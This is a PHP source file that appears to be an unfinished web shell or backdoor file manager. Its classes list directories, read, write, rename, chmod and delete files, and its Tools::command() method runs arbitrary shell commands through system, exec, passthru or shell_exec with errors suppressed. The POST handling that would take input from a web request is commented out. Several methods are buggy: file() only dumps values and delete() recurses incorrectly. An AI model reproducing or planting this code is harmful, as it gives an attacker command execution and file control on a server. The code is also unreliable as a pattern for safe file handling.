<?php
/**
 * 
 */
class listFiles
{
	protected $path;
	protected $result;
	
	function __construct()
	{
		$this->path = str_replace("\\", "/", getcwd());
	}

	public function path()
	{
		return $this->path;
	}

	public function list($type)
	{
		$this->result= [];
		foreach (scandir($this->path()) as $key => $value) {
			$filename = [
				"getPathname"	=> $this->path() . DIRECTORY_SEPARATOR . $value,
				"getName"		=> $value
			];

			switch ($type) {
				case "dir":
					if (!is_dir($filename["getPathname"]) || $value === "." || $value === "..") {
						continue 2;
					}
					break;
				
				case "file":
					if (!is_file($filename["getPathname"])) {
						continue 2;
					}
					break;
			}

			$this->result[] = $filename;
		} return $this->result;
	}

	public function dirs()
	{
		return $this->list("dir");
	}

	public function files()
	{
		return $this->list("file");
	}

	public function listAll($dir)
	{
		foreach (scandir($dir) as $key => $value) {
			$path = $dir . DIRECTORY_SEPARATOR . $value;
			if (!is_dir($path)) {
				$this->result[] = $value;
			} elseif ($value != '.' && $value != "..") {
				$this->listAll($path);
				$this->result[] = $value;
			}
		} return $this->result;
	}
}

/**
 * 
 */

class Tools
{
	protected $path, $name, $resource, $data = null, $cwd = null;
	
	function __construct()
	{
		$this->path = str_replace("\\", "/", getcwd());
	}

	public function make($filename)
	{
		$this->resource = $filename;
		return $this;
	}

	public function path($path)
	{
		$this->cwd = $path;
		return $this;
	}

	public function dir()
	{
		return (!empty($this->resource)) ? mkdir($this->cwd . DIRECTORY_SEPARATOR . $this->resource) : false;
	}

	public function file($data)
	{
		foreach ($this->resource as $key => $value) {
			$explode = explode(",", $this->resource[$key]);
			foreach ($explode as $value) {
				var_dump($value);
				// $action = new action($this->cwd . DIRECTORY_SEPARATOR . $value);
				// return (!empty($data)) ? $action->open("write")->write($data) : false;
			}
		}
	}

	public function command($command)
	{
		$command = $command;

		switch ($command) {
			case function_exists("system"):
				@ob_start();
				@system($command);
				$buff = @ob_get_contents(); 
				@ob_end_clean();
				return $buff; 	
				break;
			
			case function_exists("exec"):
				@exec($command, $result);
				$buff = "";
				foreach ($result as $key => $value) {
					$buff .= $value;
				} return $buff;
				break;

			case function_exists("passthru"):
				@ob_start();
				@passthru($command);
				$buff = @ob_get_contents();
				@ob_end_clean();
				return $buff;
				break;

			case function_exists("shell_exec"):
				$buff = @shell_exec($command);
				return $buff;
				break;
		}
	}
}

class action
{
	protected $path, $filename;
	protected $handle;
	protected $modes = [
			"read"		=> "r",
			"write" 	=> "w",
			"append"	=> "a"
	];
	
	function __construct($filename)
	{
		$this->path = str_replace("\\", "/", getcwd());
		$this->filename = $filename;
	}

	public function open($mode)
	{
		if (!empty(trim($this->filename))) {
			$this->handle = fopen($this->filename, $this->modes[$mode]);
			return $this;
		}
	}

	public function read()
	{
		return htmlspecialchars(file_get_contents($this->filename));
	}

	public function write($data)
	{
		return (!empty($data)) ? fwrite($this->handle, $data) : false;
	}

	public function chname($newname)
	{
		return (!empty($this->filename)) ? rename($this->filename, $this->path . DIRECTORY_SEPARATOR . $newname) : false;
	}

	public function chmode($mode)
	{
		return (!empty($this->filename)) ? chmod($this->filename, $mode) : false;
	}

	public function delete()
	{
		if (is_dir($this->filename)) {
			foreach (scandir($this->filename) as $key => $value) {
				if ($value != "." && $value != "..") {
					if (is_dir($this->filename)) {
						$this->delete($this->filename . DIRECTORY_SEPARATOR . $value);
					} else {
						unlink($this->filename . DIRECTORY_SEPARATOR . $value);
					}
				}
			}
			if (@rmdir($this->filename)) {
				return true;
			} else {
				return false;
			}
		} else {
			if (@unlink($this->filename)) {
				return true;
			} else {
				return false;
			}
		}
	}
}

/*$list = new listFiles;

$Tools = new Tools;


if (isset($_POST['submit'])) {
	$Tools = new Tools;
	if ($Tools->make($_POST['file'])->path("image")->file("testimoni")) {
		print("success");
	} else {
		print("failed");
	}
}*/
